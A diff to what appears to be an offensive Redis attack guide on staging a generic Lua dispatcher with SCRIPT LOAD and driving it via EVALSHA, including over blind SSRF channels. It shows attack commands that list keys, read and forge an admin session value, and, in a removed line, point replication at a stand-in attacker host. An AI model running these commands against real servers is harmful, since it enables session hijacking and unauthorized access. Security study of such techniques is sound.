@@ -22,13 +22,15 @@ SCRIPT LOAD "return redis.call(ARGV[1], ARGV[2], ARGV[3])"
 # -> "5f2e...c8"
 ```
 
-The loaded body is a generic command dispatcher: it calls whatever command name and arguments are passed at execution time. A single cached script then drives arbitrary commands through `EVALSHA`:
+The loaded body is a generic command dispatcher: it calls whatever command name and arguments are passed at execution time. A single cached script then drives many **script-allowed** commands through `EVALSHA`:
 
 ```
-EVALSHA 5f2e...c8 0 CONFIG GET requirepass
 EVALSHA 5f2e...c8 0 KEYS *
-EVALSHA 5f2e...c8 0 SLAVEOF attacker.tld 6379
+EVALSHA 5f2e...c8 0 GET sessions:admin
+EVALSHA 5f2e...c8 0 SET sessions:admin forged-value
 ```
+
+The dispatcher is still bound by the scripting sandbox: `noscript` commands such as `CONFIG`, `SLAVEOF`/`REPLICAOF`, and `DEBUG` are rejected inside the script, so an admin-config or write-to-disk path (see [CONFIG SET abuse](../config-set-abuse.md)) must be driven by direct commands, not through this loaded dispatcher.
 
 Because the digest is deterministic, the attacker can compute it offline from the intended body and begin issuing `EVALSHA` immediately after the load succeeds, without reading the load's response. This is useful over blind or one-directional channels such as an SSRF-smuggled RESP connection (see [Command injection](../command.md)), where command output may not return but the staged script still executes.
 
